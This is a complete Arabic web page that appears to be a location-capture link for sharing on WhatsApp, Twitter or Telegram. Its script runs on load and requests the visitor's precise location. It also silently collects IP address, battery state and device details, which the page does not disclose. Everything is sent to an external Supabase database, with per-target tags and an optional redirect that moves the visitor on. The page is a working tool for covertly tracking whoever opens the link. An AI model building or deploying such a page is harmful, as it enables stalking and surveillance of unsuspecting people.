<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>مشاركة موقعي</title>

  <!-- Open Graph (للواتساب/تويتر/تلغرام) -->
  <meta property="og:title" content="شارك موقعك الآن 📍" />
  <meta property="og:description" content="اضغط على الرابط وامنح الإذن ليتم إرسال موقعك مباشرة." />
  <meta property="og:image" content="https://img.youm7.com/large/201704190111181118.jpg" />
  <meta property="og:url" content="https://xb7rbx.github.io/X/capture.html" />
  <meta property="og:type" content="website" />

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="شارك موقعك الآن 📍" />
  <meta name="twitter:description" content="اضغط على الرابط وامنح الإذن ليتم إرسال موقعك مباشرة." />
  <meta name="twitter:image" content="https://xb7rbx.github.io/X/assets/preview.jpg" />

  <style>
    body{font-family:system-ui,-apple-system,Segoe UI;min-height:100svh;display:grid;place-items:center;padding:24px;line-height:1.7;background:#fafafa}
    .card{max-width:560px;width:100%;border:1px solid #e5e7eb;border-radius:14px;padding:22px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
    .muted{color:#6b7280}
    .ok{color:#047857;font-weight:700}
    .err{color:#b91c1c;font-weight:700}
    progress{width:100%}
    .hidden{display:none}
  </style>
</head>
<body>
  <div class="card">
    <h1>📍 يتم الآن تحديد موقعك…</h1>
    <p class="muted">اختر <b>سماح</b> عندما يطلب المتصفح إذن الموقع.</p>
    <progress id="bar" max="100" value="25"></progress>
    <p id="status" class="muted">جارِ الطلب…</p>
    <button id="retry" class="hidden">إعادة المحاولة</button>
  </div>

  <!-- مكتبة supabase -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // ضع بيانات مشروعك:
    const PROJECT_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
    const ANON_KEY    = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
    const TABLE       = 'pings';

    const supabase = window.supabase.createClient(PROJECT_URL, ANON_KEY);

    const bar = document.getElementById('bar');
    const statusEl = document.getElementById('status');
    const retryBtn = document.getElementById('retry');

    const qs = new URLSearchParams(location.search);
    const note = qs.get('note') || null;         // مثال: ?note=عميل-واتساب
    const redirect = qs.get('redirect') || null; // مثال: ?redirect=/thanks.html

    function setStatus(text, cls){ statusEl.textContent=text; statusEl.className=cls||'muted'; }

    async function getIP(){
      try{
        const r = await fetch('https://api.ipify.org?format=json',{cache:'no-store'});
        const j = await r.json();
        return j.ip || null;
      }catch{ return null; }
    }

    async function getBatteryInfo(){
      try{
        if (!navigator.getBattery) return { battery_level:null, battery_charging:null };
        const b = await navigator.getBattery();
        return { battery_level: b.level, battery_charging: b.charging };
      }catch{ return { battery_level:null, battery_charging:null }; }
    }

    async function save(row){
      const { error } = await supabase.from(TABLE).insert([row]);
      if (error) throw error;
    }

    async function capture(){
      bar.value = 35; setStatus('يتم طلب الإذن…');
      if(!('geolocation' in navigator)) throw new Error('المتصفح لا يدعم تحديد الموقع');

      const [ipPromise, battPromise] = [getIP(), getBatteryInfo()];

      return new Promise((resolve,reject)=>{
        navigator.geolocation.getCurrentPosition(async pos=>{
          try{
            bar.value = 80;
            const { latitude:lat, longitude:lng, accuracy, speed=null, heading=null } = pos.coords;
            const ua = navigator.userAgent;
            const ip = await ipPromise;
            const { battery_level, battery_charging } = await battPromise;
            const device_info = ua;

            await save({ lat, lng, accuracy, ip, ua, note, speed, heading, battery_level, battery_charging, device_info });
            bar.value = 100;
            resolve({lat,lng});
          }catch(e){ reject(e); }
        }, err=> reject(new Error(err.message||'تعذر الحصول على الموقع')),
        { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
      });
    }

    async function start(){
      try{
        await capture();
        setStatus('تم إرسال موقعك ✅','ok');
        if(redirect){ setTimeout(()=>location.href=redirect,800); }
      }catch(e){
        setStatus('خطأ: '+e.message,'err');
        retryBtn.classList.remove('hidden');
      }
    }

    retryBtn.addEventListener('click', ()=>{ retryBtn.classList.add('hidden'); setStatus('إعادة المحاولة…'); start(); });
    start(); // يبدأ تلقائيًا
  </script>
</body>
</html>
